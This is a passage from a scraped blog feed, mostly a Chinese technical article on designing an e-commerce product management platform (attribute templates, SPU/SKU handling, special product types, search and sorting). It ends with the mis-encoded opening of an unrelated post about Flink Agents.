/></p>\n<p>PowerDotNet实现的商品平台更进一步，设计了商品属性表，这张表对属性名和属性值进行了大量冗余。这样设计的优点是属性名或者属性值变更时不会影响到现有的商品属性；缺点也比较明显，某些查询场景下需要行转列处理，冗余数据略多，如果相同的改动就需要作用于大部分商品，可能不得不改动大量的冗余数据。</p>\n<p>PowerDotNet开发的商品平台有商品属性名和商品属性值自动同步功能，可以按照商品、SPU、分类、品牌等不同维度和粒度进行批量同步数据操作，大大减少属性数据变更导致的业务和运营人员的工作量。</p>\n<p>当然这个中间商品属性表的维护还是需要人员花费大量精力和时间，毕竟商品属性很多，幸好有模板设计法，PowerDotNet内置了很多模板工具和方法，可以进行批量增删改操作，同样能大大减少工作量。</p>\n<p>不得不说，元数据大法好，模板大法好，PowerDotNet大法好，咩哈哈。</p>\n<h3>五、模板管理</h3>\n<p>电商平台的商品琳琅满目，属性成千上万，如果我们对商品属性管理按照商品一个一个进行录入，工作量巨大，而且容易出错。</p>\n<p>通过模板设计大法，我们完全没有必要按照商品进行一个一个管理，可以先定义好属性模板，按照SPU、分类、品牌等进行模板管理，只需要录入必须的基本的属性名和属性值就可以按照模板批量管理。</p>\n<p>当然，模板生成的商品属性通常都是通用的没有明显差异化的，需要个性化的商品属性我们可以按照商品一个一个进行补充，这种操作通常很少，工作量完全可以接受。</p>\n<h4>1、模板信息</h4>\n<p>可以按照SPU、分类、品牌等分组命名模板，望文知义，所见即所得，便于运营和管理。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206144318239-1587383372.png\" /></p>\n<h4>2、模板属性</h4>\n<p>定义模板是为了解决属性繁多易错的问题，所以模板就要和属性名、属性值产生关联关系。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206144422535-383976370.png\" /></p>\n<h4>3、复制模板</h4>\n<p>对于相似SPU、分类或品牌，PowerDotNet商品平台提供了快捷复制工具，可以按照已有模板批量复制模板和模板关联属性，大大减少业务工作量。</p>\n<h4>4、同步模板</h4>\n<p>模板的改动相对而言比较少，但是如果有变更，比如属性名值的增删改，我们可以通过同步工具自动批量将变更数据同步到各个商品中，业务要做的事情就是点下按钮而已。</p>\n<h4>5、SPU模板</h4>\n<p>一种SPU可以包含多种商品，定义好SPU模板，可以一键生成相同SPU下的一组商品的商品属性，差异化的属性再到商品属性管理页面下独立设置修改即可。</p>\n<p>举例：SPU为华为P50 Pro，主要差异属性有颜色（黑色、白色、银色、金色）和机身内存（128G、256G、512G），定义好模板，可以一键生成4x3=12个商品的所有商品属性。</p>\n<p>根据SPU自动生成商品的过程，其实也是自动生成SKU的过程，但这个过程在PowerDotNet商品管理里可以弱化，后续介绍SKU的时候再介绍下为什么要弱化这个过程。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206151538327-1922451407.png\" /></p>\n<h4>6、分类模板</h4>\n<p>如果某些分类下的商品属性非常相似，可以定义比SPU更粗力度的模板，批量生成相同分类下的商品属性，差异化的属性再到商品属性下独立设置修改即可。</p>\n<p>举例：三级分类为手机，定义好分类下的模板，可以一键批量生成手机分类下的商品属性。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206152127989-2138100602.png\" /></p>\n<h4>7、分类品牌模板</h4>\n<p>和分类模板的主要功能和作用类似，只不过分类品牌模板是在分类相同的情况下再找到相同品牌的商品，商品范围被缩小，差异化的属性再到商品属性下独立设置修改即可。</p>\n<p>举例：三级分类为手机，品牌为华为，定义好分类品牌下的模板，可以一键批量生成手机分类下华为手机的商品属性。</p>\n<p><img alt=\"\" src=\"https://img2022.cnblogs.com/blog/32361/202208/32361-20220809084739759-486578833.png\" /></p>\n<h3><strong>六、商品管理</strong></h3>\n<p>商品管理模块主要包括商品信息、商品属性、商品条码、商品价保、商品图片、商品视频等常用功能。</p>\n<p>有些公司的商品管理代码，对很多基础概念那叫一个不讲究，尤其是SPU和SKU，规格、属性和参数等容易混淆的内容，有经验的人看过就知道，不出意外的话，总有一天会出意外。</p>\n<h4>1、SKU</h4>\n<p>SKU = Stock Keeping Unit(库存量单位)，严格按照定义来看，显而易见，SKU肯定不完全等于商品，实际情况也确实是这样的，商品定义远远比SKU要复杂的多，商品要应对的变化也远比SKU复杂。</p>\n<p>在传统的商品管理体系设计和实现中，商品管理一般都会包含SPU、SKU和商品信息三层管理逻辑，商品ID(GoodsId)、SkuId和SpuId之间有关联关系，抽象程度越高，定义越明确，商品更容易管理。</p>\n<p>个人经验中，SKU主要基于商品的销售属性生成，常用于库存和价格管理，后台控制更多；而商品的整体定义，除了销售属性，还有条码、图片、视频和营销等等各种元素，前后台都有复杂控制逻辑。</p>\n<p>SPU可以根据模板自动生成SKU和商品，SKU属于商品和SPU之间的过渡角色，如果你开发过的WMS、MES和商品管理系统CMS都是以商品为准，SKU的地位就很尴尬，让人几乎感觉不到它的存在。</p>\n<p>PowerDotNet的SKU设计参考了前厂的商品管理，商品和SKU仅有简单的关联关系，实际商品管理都是以商品为准，弱化了SKU的存在，WMS和MES中的商品库存也是商品为准，这就是理论和实践的区别。</p>\n<h4>2、商品档案</h4>\n<p>支持商品信息的增删改查，支持快捷生成商品。通过模板可以批量生成商品属性，通过SPU可以一键批量生成商品。</p>\n<p>PowerDotNet实现的商品信息管理兼具易用性和可扩展性，查询也比较方便，对于中小公司，甚至不需要上全文检索，直接创建宽表根据RDBMS的查询功能即可实现基本业务需求。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221213145631931-195792669.png\" /></p>\n<p>商品信息字段比较多，商品管理后台提供了完善的偷懒工具，只要点击复制按钮，必填参数改一下或者不填由后台自动生成，可以大大提高录入数据速度和准确性，对于同品类或相同SPU的商品有奇效。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221208175354118-561045316.png\" /></p>\n<h4>3、商品属性</h4>\n<p>商品信息里的字段主要是常用检索字段和通用信息字段，商品属性定义更丰富的商品维度描述。</p>\n<p>字典表属性名和属性值修改后可以批量同步到商品属性中，这是一个比较危险的操作，尤其是销售属性的批量同步变更，需要业务反复查询对比确认后才能操作。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221208175449198-1936930492.png\" /></p>\n<p>前面属性管理处我们已经说过，PowerDotNet实现的商品平台对商品属性表做了大量冗余，支持自定义，支持修改特定商品属性名值对而不影响全局。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206190656761-1329187443.png\" /></p>\n<h4>4、商品条码</h4>\n<p>条码的应用非常广泛，PowerDotNet实现的商品条码支持商品普通条码和二维码的生成。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206210757518-412261095.png\" /></p>\n<p>某些商品还需要按渠道不同生成特定渠道的条码和二维码，PowerDotNet预留了扩展用以后续支持。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221212205016231-411154734.png\" /></p>\n<p>商品条码和商品库存有一定的关系，通常情况下，相同商品SKU的有效条码可以重复，重复个数和库存数相等，当然不严格的情况下条码也可以重复生成或作废，并不强求条码和库存数一定相等。</p>\n<h4>5、商品价保</h4>\n<p>价保基础表定义价保信息，商品再根据商品和价保关系表构成商品价保，这样设计的好处是价保信息可以复用。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206205759684-1812971442.png\" /></p>\n<p>其中价保关系表还特别设计了价保开始和结束时间，满足绝大多数电商促销活动的需求。当然有些电商的活动规则引擎会把价保自动放到规则中去，不需要在商品系统中进行价保维护。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206205820053-692332191.png\" /></p>\n<h4>6、商品图片</h4>\n<p>商品图片主要利用文件平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/file-platform-design-and-implement.html\" target=\"_blank\">Power.File</a>实现图片的管理，本文不再赘述。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206191530363-1760500606.png\" /></p>\n<h4>7、商品视频</h4>\n<p>和商品图片类似，目前短视频极其流行，视频文件大小较大，对文件服务器有较高要求。</p>\n<h4>8、商品统计</h4>\n<p>电商系统中商品众多，排序在商品展示中有重要作用，常见的排序指标比如评论数、收藏数、销量等等，这些数据主要由统计计算而来，直接设计存储在商品系统中非常合理，当然这些数据存储在其他系统（如CRM、订单等）中进行汇总定时通知到商品系统或者商品系统主动调用接口查询也是常见的可行方案。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221213145745193-1646418969.png\" /></p>\n<h4>9、其他</h4>\n<p>其他如商品买家秀等个性化数据没有设计在商品平台里，个人认为这些模块功能属于商品系统的可扩展设计，对于中小电商系统它们完全可以划归到<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/pcrm-design-and-implement.html\" target=\"_blank\">Power.PCRM</a>中去。</p>\n<p>商品库存则很明显需要开发库存或者进销存系统进行商品库存管理，复杂点的库存管理系统还需要包括原料、辅料、生产加工等等功能模块，这些正是WMS和MES系统的长项。</p>\n<p>为了查漏补缺，我试着问国内几个主流AI工具相同的问题“提供一份电子商务商品系统主要的数据库表设计”，最终比较满意的竟然是<a href=\"https://www.doubao.com/chat/\" rel=\"noopener nofollow\" target=\"_blank\">字节豆包</a>，而我预料中最可能接近答案的<a href=\"https://tongyi.aliyun.com/qianwen/\" rel=\"noopener nofollow\" target=\"_blank\">通义千问</a>还不如<a href=\"https://www.deepseek.com/\" rel=\"noopener nofollow\" target=\"_blank\">DeepSeek</a>给的结果靠谱。</p>\n<h3>七、日志管理</h3>\n<p>商品平台是电商系统最基础最重要最敏感的业务系统之一，所以对商品的增删改操作都要有业务操作日志，某些核心查询操作也需要按需记录审计日志。</p>\n<h4>1、商品日志</h4>\n<p>主要用于记录并管理商品的核心操作日志，特殊情况下还可根据这些日志进行业务数据还原和恢复。</p>\n<p>根据个人经验，所有基础数据表的修改，自定义商品属性、销售属性、价格等敏感参数都需要重点记录日志，防止修改错误需要紧急修复。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206192659006-980543551.png\" /></p>\n<h4>2、系统日志</h4>\n<p>系统日志相对商品日志，重要性就不那么突出，主要记录一些日常操作日志、对外提供接口日志、业务不敏感日志等。</p>\n<p>系统日志可通过定时任务自动归档或者清理。</p>\n<h3>八、特殊商品</h3>\n<p>上面列举的一系列商品功能只是最通用最基础的电商商品抽象，还有一些特殊商品，正是我实现过程中痛苦和挣扎的主要来源，可能还需要按需进行额外扩展设计和管理。</p>\n<p>Power.Commodity一开始只是我没事写点代码让自己高兴高兴的临时作品，目的也只是单纯总结和提取个人工作过的商品代码，但写着写着就发现越来越深不见底，尤其是特殊商品实在难以全部覆盖。</p>\n<p>本文不探讨特殊商品的具体管理设计开发和建设细节，因为这是另外一个漫长的故事了，对于体力活我也是有追求的，所谓识时务者为俊杰^_^，只简单说说个人实际参与设计开发过的几种特殊商品。</p>\n<h4>1、汽车商品</h4>\n<p>汽车商品是一种特殊商品，区别于一般商品的主要特点包括：</p>\n<p>（1）、零件多，技术含量高，属性多且复杂</p>\n<p>（2）、金额较大</p>\n<p>（3）、耐用品</p>\n<p>（4）、涉及重大安全问题</p>\n<p>（5）、有专属的交通法规，管理人员，道路辅助等</p>\n<p>（6）、大件，重量较大，不易快递或转运，配合门店或4S店销售</p>\n<p>（7）、是高档金融消费品，和金融保险联系紧密</p>\n<p>（8）、其他，如税费较多，汽车商品常见的5种税：车辆购置税、车船税、增值税、消费税、关税，除车款外其他费用包括上牌费、保险（交强险、商业险）等</p>\n<p>多层级属性是汽车商品的一个显著特点，汽车商品常见的一级属性包括品牌、厂商、车系、车款、车身、发动机、电动机、变速箱、底盘转向、车轮制动、安全装备、操控配置、外部配置、内部配置、座椅配置、多媒体配置、灯光配置、玻璃/后视镜、空调/冰箱、高科技配置等，每一个属性下又可以继续拆分出不同的子属性，比如多媒体配置，我们可以继续拆分出GPS导航、定位互动服务、中控台彩色大屏、蓝牙/车载电话、车载电视、后排液晶屏、外接音源接口、CD支持MP3/WMA、多媒体系统、扬声器品牌、扬声器数量、220V/230V电源系统等子属性。</p>\n<p>相比普通商品，汽车商品查询检索有较多的多规格设计，常见的除了分类和品牌外，还包括价格、排量（如1.1-1.6L、1.7-2.0L）、能源（如汽油、新能源）、结构（如两厢、三厢）、国别（如中国、欧系）、配置（如全景天窗、电动天窗）、驱动、变速箱、座位、进气形式、生产方式等。</p>\n<p>个人开发经验中，和汽车这种巨多规格和属性的商品类似的还包括药品和生鲜类商品，对于这种繁多而复杂的商品，一张宽表一把梭的设计特别容易造成开发和维护灾难。</p>\n<p>PowerDotNet的商品属性设计和模板方法完全可以应对汽车商品的多规格属性配置，只是属性层级多，属性字段也很多，查询逻辑略微复杂。</p>\n<h4>2、生鲜商品</h4>\n<p>生鲜商品的最大特点是任意性和随意性，正是因为这两个特性导致生鲜商品的标准化远远滞后于一般商品，而标准化在商品平台设计与实现中至关重要。</p>\n<p>我们还是以前面提到的华为手机举例，通过一个简单示例对比，看一下标准化生鲜商品为什么会比较困难：</p>\n<p>华为P50 Pro手机是一种SPU；生产于中国大陆基于鸿蒙操作系统于2021年上市的黑色机身内存128GB运行内存8GB...的华为P50 Pro手机是一个SKU。</p>\n<p>相对应的，生鲜类标准化商品会有如下描述：</p>\n<p>南汇8424西瓜是一种SPU；产于中国上海的于2021年上市的重量为XX公斤到YY公斤...的南汇8848西瓜是一个SKU。</p>\n<p>\"人不能两次踏进同一条河流\"，这是古希腊哲学家赫拉克利特说的。西瓜不能两次长出同一种重量，我们也可以说的富有哲理，咩哈哈。</p>\n<p>假如标准化不加约定和限制，仅仅根据生鲜类商品的重量就能组合出很多种商品，造成SKU组合爆炸难题。</p>\n<p>有人可能会有疑问，为什么不按照单位重量或体积进行商品定义，比如产于中国上海的于2021年上市的每公斤5元的南汇8848西瓜是一个SKU，然后用户下订单，直接按照实际购买重量乘以单价即可。</p>\n<p>这种方案看上去非常完美，但是有一个先天缺陷，重量是需要人力称出来的，生鲜电商由于是大规模线上经营，通常都是预先通过生产加工系统进行称重，然后更新库存，不可能像实体店那样当面现称现卖。</p>\n<p>这个问题的解决方案就是针对特定生鲜产品进行评估，对相同SPU的商品给出一个大致模糊的重量（或体积）范围以满足生产加工的需要，商定出一个用户能接受的价格，达到一种买和卖的平衡。</p>\n<p>在一些电商站点上，生鲜商品比普通售卖的商品看上去没有更加复杂，有些行业特点比如储运条件（常温、恒温、冷冻、冷藏等）通过属性名值对或者扩展表也能很好支持，之所以拿出来单独说，主要是因为生鲜商品标准化背后隐藏的复杂性。</p>\n<p>生鲜商品非标准化的物品很难用标准化的商品软件来管控，很多生鲜电商公司都只能按需自研信息化服务，比如供应链、生产加工、仓储管理、质检、运输、配送等等，难度可想而知。</p>\n<p>个人曾经参与开发维护过一套生鲜系统，业务逻辑之恶劣，实现之奇葩，单据之多样，软件流程之长，使用之不友好，每看一遍代码都差点灵魂出窍，业务系统做成这种效果也是常人所不能及也。咩哈哈。</p>\n<p>我尝试过用PowerDotNet新的商品设计思路重构一个生鲜商品系统，但是难度和工作量极大，还会影响其他系统，最后只能撤销改动放弃努力，曾经有过美好，但有些事物失去了就是失去了，不可强求。</p>\n<p>假如商品平台要支持生鲜商品的主要特性，可能原料、辅料、包装方案、BOM、计划单、提货单、加工单、反加工单、损益单、尾料、原料顶替等名词都要再温故知新一遍，往事历历在目却遥不可及也。</p>\n<p>通用性、标准性和普适性的公共服务系统才是PowerDotNet努力的方向，而任意性和随意性天生就是公共服务的天敌，抽象和实现的难度肉眼可见成倍剧增，所以最新商品平台设计暂不支持生鲜类商品。</p>\n<h4>3、虚拟商品</h4>\n<p>最典型而常见的几种虚拟商品如下：</p>\n<p>（1）、网络游戏卡，是按服务公司的规定以现金兑换虚拟点(积分)的形式，通过消耗虚拟点(积分)来享受服务的一种支付形式。</p>\n<p>（2）、移动/联通/电信/充值，包括话费充值，流量充值等。</p>\n<p>（3）、网络软件，一般是指系统的操作系统、协议和应用级的提供服务功能的专用软件。</p>\n<p>（4）、网站产品，以产品的眼光看待网站是网站产品的精髓所在。网站产品不同于软件产品、服务产品、工业产品等。网站产品是一类信息产品，以网站的形式提供信息、服务或二者的结合是它的主要表现形式。</p>\n<p>我个人最熟悉的虚拟商品，包括网文（按章节收费）和电子书以及游戏点卡，某些公司的虚拟货币充值也可以抽象成一种商品，只要让用户下订单花钱支付购买同时又没有直接拿到实物产品，就可以认为用户购买的是虚拟商品。</p>\n<h4>4、服务商品</h4>\n<p>服务型商品也是日常生产生活中经常碰到的一种商品类型。最典型的如火车票、汽车票、酒店、机票、旅游度假等商品。</p>\n<p>以我个人比较熟悉的某OTA（Online Travel Agency，在线旅行社）机票产品为例，服务型商品也非常考验开发人员的设计和架构水平。</p>\n<p>机票系统涉及到很多业务数据表，常见的比如区域、二字码、三字码、机场、航站楼、航线、航司、飞机机型、中转地、行程总时长、仓位、常旅客、机票、机票库存、报价信息等表。</p>\n<p>机票、火车票、汽车票、船票和邮轮等非常相似，看上去都是一个“占座”的商品形式，完全可以抽象出公共部分。而酒店则有一个间夜的概念，外加酒店内的附属商品管理，复杂度更胜一筹。</p>\n<p>我们可以将机票航线、航班号、起降时间和具体飞机及仓位的组合（也就是一张飞机票）直观理解为商品，常见的机票商品包括单程和往返机票，还可以根据不同航线组合出联程/多程机票。</p>\n<p>对于机票，大家还应该听说过中航信（含eTerm 或IBE+，两者都知道的，我只想说吾道不孤矣），机票查询和预定基本离不开它。</p>\n<p>注：IBE+（Internet Booking Engine），即中国航信互联网订座引擎，是基于因特网的开放平台技术，它为各种用户应用系统提供访问中国航信传统订座业务系统的途径，是采用API方式的接口。</p>\n<p>据我所知，机票库存可以通过中航信的eTerm软件来查询，行业内的一般做法是将eTerm软件功能封装成接口，供内部系统使用，当然除了eTerm，现在还有IBE+以API接口的形式提供查询和预定功能。</p>\n<p>机票的库存信息一般称为AV信息，这个称呼的来源主要源于eTerm（黑屏）查库存指令。由于库存信息非常重要，因此每家OTA都会花费很多的流量在获取航班的AV信息上。</p>\n<p>由于eTerm和IBE+的接口响应时间较慢，因此OTA采用的方法基本都是主动去获取AV信息，然后缓存起来，绝大多数用户查询时直接拿缓存数据即可，当然有些情况下还是会出现查询缓存失败，再去实时获取AV信息的情况。</p>\n<p>相较于汽车、生鲜和虚拟商品，PowerDotNet的商品系统可能只需要加一些业务扩展表就可以完美支持，而服务类商品通常业务复杂，不容易做成通用设计，所以PowerDotNet已完成的商品设计将服务商品排除在外。</p>\n<p>我尝试着使用国内流行的人工智能服务（<a href=\"https://tongyi.aliyun.com/qianwen/\" rel=\"noopener nofollow\" target=\"_blank\">通义千问</a>、<a href=\"https://www.doubao.com/chat/\" rel=\"noopener nofollow\" target=\"_blank\">字节豆包</a>、<a href=\"https://www.deepseek.com/\" rel=\"noopener nofollow\" target=\"_blank\">DeepSeek</a>、<a href=\"https://yiyan.baidu.com/\" rel=\"noopener nofollow\" target=\"_blank\">文心一言</a>和<a href=\"https://hunyuan.tencent.com/\" rel=\"noopener nofollow\" target=\"_blank\">腾讯混元</a>），实现机票预定功能，给出的代码真是一言难尽，AI目前还无法给出超过预期的方案，祖传代码暂时还是安全的^_^。</p>\n<p>假如后续仍然需要加入机票、酒店、火车票、汽车票等服务商品功能，最好按照服务商品的特殊规范进行抽象设计，独立出来服务商品平台未尝不是一个好方法，元数据和模板设计大法同样有用武之地。</p>\n<p>当然，目前看来PowerDotNet实现的商品管理系统还是比较基础的传统的商品管理，想做到大一统的支持各种形态的商品，还需要做很多设计和实现工作，虽然我个人手头有现成的业务代码和解决方案可参考，咩哈哈。</p>\n<h3>九、商品搜索</h3>\n<h4>1、实现功能</h4>\n<p>商品搜索实现的功能主要包括按关键字搜索、中文分词、历史搜索、热门搜索、推荐搜索、联想关键词等等，绝大多数大中型电商公司的全站搜索服务就包括商品搜索功能。</p>\n<h4>2、解决方案</h4>\n<p>商品搜索在商品管理上算是常用而又有点技术难度的功能了，曾经有一种简单直接高效的暴力设计方法，就是添加一张商品关键词表，不过随着NoSQL和NewSQL的兴起，这种设计方案已显得非常落后。</p>\n<p>个人早年有幸独立实现过一个典型而朴素的商品搜索功能，按照商品分类、标签以及任意关键字，通过MySQL的查询功能，模糊或精确匹配，按权重分页展示，现在想来依然十分好笑，咩哈哈。</p>\n<p>搜索有很多现成的解决方案，比如基于Lucene或者ElasticSearch全文检索实现的搜索服务，按不同数据源（比如商品）建立索引，通过分词优化匹配查询索引，可按需实现对应系统（如商品）查询服务。</p>\n<p>Lucene和ElasticSearch在实践中极易一不小心踩到很多坑，尤其是ElasticSearch，个人印象最深的是看上去简单常用的分页查询，在数据量很大或者有较多分片的情况下，越往后分页查询性能越拉跨。</p>\n<p>个人曾经所在电商公司使用ES实现基本搜索功能，外加Redis和SqlServer配合实现搜索服务兜底方案，性能恶劣的sql语句like模糊匹配是最差的选择，like查询默认选择可以使用索引的左匹配。</p>\n<p>搜索服务的设计与实现比较有技术挑战，尤其是全站搜索和商品搜索结合，值得再开一篇文章详细介绍，不过这就是更偏重于分词索引实现搜索服务的另一个话题了，本文不再展开详细说明。</p>\n<h3>十、商品排序</h3>\n<p>商品搜索和商品排序是密不可分的，对于商品搜索结果，我们总是要根据一定的排序规则展示给用户。下面列举电商中常见的几种商品排序：</p>\n<h4>1、直接根据商品属性排序</h4>\n<p>比如商品价格、上架时间、商品序号、自定义排序序号等</p>\n<h4>2、根据商品相关统计进行排序</h4>\n<p>比如商品销量、好评数、关注数、浏览次数、回购率等</p>\n<h4>3、根据商家相关统计进行排序</h4>\n<p>比如商家信用、商家门店数等</p>\n<h4>4、根据距离排序</h4>\n<p>最常见最典型的就是在线外卖订餐平台，根据消费者当前位置，按照距离排序</p>\n<h4>5、综合排序</h4>\n<p>在实际电商业务场景中，系统默认推荐排序不是简单的根据单一字段进行排序，而是综合排序。</p>\n<p>通常来说，综合排序是先按商品和搜索关键词的相关性过滤，然后按上下架时间做预选，最后在预选结果里根据商品人气及质量等方面进行排序。</p>\n<h3>十一、系统交互</h3>\n<p>商品系统是电商最核心的组成部分之一，是电商平台的基础数据服务系统，和很多内部业务系统保持互通关系，整理下个人开发和对接过的几种常见互联系统。</p>\n<h4>1、订单系统</h4>\n<p>毫无疑问，订单的生成离不开商品，企业在正常的经营过程中，必须有销售商品、产品、提供劳务等业务，订单系统主要提供商品售卖服务。</p>\n<h4>2、库存系统</h4>\n<p>库存系统主要用于管理商品库存，主要包括商品入库、商品出库，商品调拨和商品盘点等操作。我们熟知的仓储WMS系统就包括库存管理。</p>\n<h4>3、采购系统</h4>\n<p>电商中的商品一般来说主要由供应商提供，我们常见的采销系统或进销存系统或供应链系统等都和商品及库存紧密相关。</p>\n<p>某些特殊电商场景除了商品，还要考虑辅料、原料（物料）等，商品管理系统的设计直接关系到采销业务系统的复杂度。</p>\n<h4>4、门店系统</h4>\n<p>门店系统主要经营企业线下业务，门店系统的经营活动也离不开商品管理系统。</p>\n<h4>5、财务系统</h4>\n<p>财务系统是电商系统中最复杂的复合型公共服务型系统，财务单据经常和商品管理有千丝万缕的联系。</p>\n<p>十多年前在帝都某电商公司做财务开发，竟然要自己写SQL访问商品表的积分字段，写windows服务计算和统计用户积分，这么普通而自信的业务逻辑放在今天你敢信？这些其实都是要规避的不合理设计。</p>\n<h4>6、票券系统</h4>\n<p>票券系统是电商中常见的营销系统，针对商品分类、SPU甚至SKU的票券设计很常见。</p>\n<h4>7、广告系统</h4>\n<p>广告系统也是电商中常见的营销系统，针对商品的广告宣传层出不穷。</p>\n<h4>8、推荐系统</h4>\n<p>电商里的推荐系统不会孤立存在，往往和商品、CRM、订单等系统配合完成业务需求。</p>\n<h4>9、CRM</h4>\n<p>主要包括针对个人用户或会员的商品偏好收集和购买统计、积分赠送等等</p>\n<h4>10、其他系统</h4>\n<p>其他如活动等电商业务系统也和商品管理有些联系。</p>\n<h3>十二、其他</h3>\n<p>个人参与设计与开发的商品系统还涉及到以下功能：</p>\n<h4>1、商品详情</h4>\n<p>一个好的商品详情页，可以有效的提升单品的转化率，对于不同终端（比如PC、APP、H5等）的商品详情页设计侧重点也会有很多不同。</p>\n<p>商品详情页的接口设计也非常考验开发人员的编程经验，是采用大而全接口还是小而美接口，这需要开发人员根据实际情况做出合适的选择。</p>\n<h4>2、多语言</h4>\n<p>商品的多语言设计和实现也很普遍，对数据表的设计有更多更高要求，虽然多语言的工作绝大多数在我看来都是体力活。</p>\n<h4>3、组合商品</h4>\n<p>为了促进销售，很多商家在售卖时会利用“捆绑销售”的策略，这样就自然而然发明出了组合商品：人为将几个单独售卖的商品组合在一起进行合并售卖的商品。</p>\n<p>SKU(组合)=m*SKU1+n*SKU2+...p*SKUx</p>\n<p>组合商品的设计可能会对商品库存管理和订单拆单逻辑造成直接的负面影响，曾经在某电商公司做过一段时间开发，没少被组合商品搞得晕头转向，尤其是某些单据的业务逻辑那是相当炸裂。</p>\n<h4>4、商品数据同步</h4>\n<p>不同系统对商品主数据的要求是不一样的，有些业务系统仅仅提供商品接口即可满足业务需求，比如订单系统。</p>\n<p>但一些后台业务系统（如WMS、MES等），往往牵涉到商品的复杂SQL查询，商品数据同步至对应业务系统也是必要的，PowerDotNet数据同步平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/datax-task-scheduler-and-data-synchronization-design-and-implement.html\" target=\"_blank\">Power.DataX</a>可轻松解决数据同步问题。</p>\n<p>&nbsp;</p>\n</div>\n<div id=\"MySignature\">\n    <div id=\"AllanboltSignature\">\n<p id=\"PSignature\"><br />\n作者：<a href=\"http://www.cnblogs.com/jeffwongishandsome/\" target=\"_blank\" title=\"据说点击推荐或者关注博主是一个程序员的优良品质，留言也是\">Jeff Wong</a> <br />\n出处：<a href=\"http://jeffwongishandsome.cnblogs.com/\" target=\"_blank\" title=\"关注要趁早啊，留言也可以啊，至少二选一吧！\">http://jeffwongishandsome.cnblogs.com/</a> <br />\n本文版权归作者和博客园共有，欢迎围观转载。转载时请您务必在文章明显位置给出原文链接，谢谢您的合作。 <br />\n</p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2025-12-31 12:11</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jeffwongishandsome\">JeffWong</a>&nbsp;\n阅读(<span id=\"post_view_count\">175</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【大数据 & AI】Flink Agents 源码解读 --- (3) --- Agent",
      "link": "https://www.cnblogs.com/rossiXYZ/p/19369869",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/rossiXYZ/p/19369869\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2025-12-31 19:17\">\n    <span>ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (3) --- Agent</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"å¤§æ•°æ®--aiflink-agents-æºç è§£è¯»-----3------agent\">ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (3) ---  Agent</h1>\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#å¤§æ•°æ®--aiflink-agents-æºç è§£è¯»-----3------agent\" rel=\"noopener nofollow\">ã€å¤§æ•°æ® &amp; AIã€‘Flink Agents æºç è§£è¯» --- (3) ---  Agent</a><ul><li><a href=\"#0x00-æ¦‚è¦\" rel=\"noopener nofollow\">0x00 æ¦‚è¦</a></li><li><a href=\"#0x01-æ ¸å¿ƒæŠ½è±¡\" rel=\"noopener nofollow\">0x01 æ ¸å¿ƒæŠ½è±¡</a><ul><li><a href=\"#11-agentæŠ½è±¡\" rel=\"noopener nofollow\">1.1 AgentæŠ½è±¡</a></li><li><a href=\"#12-action-æŠ½è±¡\" rel=\"noopener nofollow\">1.2 Action æŠ½è±¡</a></li><li><a href=\"#13-èµ„æºæŠ½è±¡\" rel=\"noopener nofollow\">1.3 èµ„æºæŠ½è±¡</a></li><li><a href=\"#14-æ‰§è¡ŒçŽ¯å¢ƒæŠ½è±¡\" rel=\"noopener nofollow\">1.4 æ‰§è¡ŒçŽ¯å¢ƒæŠ½è±¡</a></li><li><a href=\"#15-äº‹ä»¶æŠ½è±¡\" rel=\"noopener nofollow\">1.5 äº‹ä»¶æŠ½è±¡</a></li><li><a href=\"#16-é…ç½®æŠ½è±¡\" rel=\"noopener nofollow\">1.6 é…ç½®æŠ½è±¡</a></li></ul></li><li><a href=\"#0x02-workflow-style-agent-å’Œreactagent\" rel=\"noopener nofollow\">0x02 Workflow Style Agent å’ŒReActAgent</a><ul><li><a href=\"#21-ç‰¹æ€§\" rel=\"noopener nofollow\">2.1 ç‰¹æ€§</a><ul><li><a href=\"#211-è®¾è®¡ç†å¿µ\" rel=\"noopener nofollow\">2.1.1 è®¾è®¡ç†å¿µ</a></li><li><a href=\"#212-æŽ§åˆ¶æµ\" rel=\"noopener nofollow\">2.1.2 æŽ§åˆ¶æµ</a></li><li><a href=\"#213-å®šåˆ¶çº§åˆ«\" rel=\"noopener 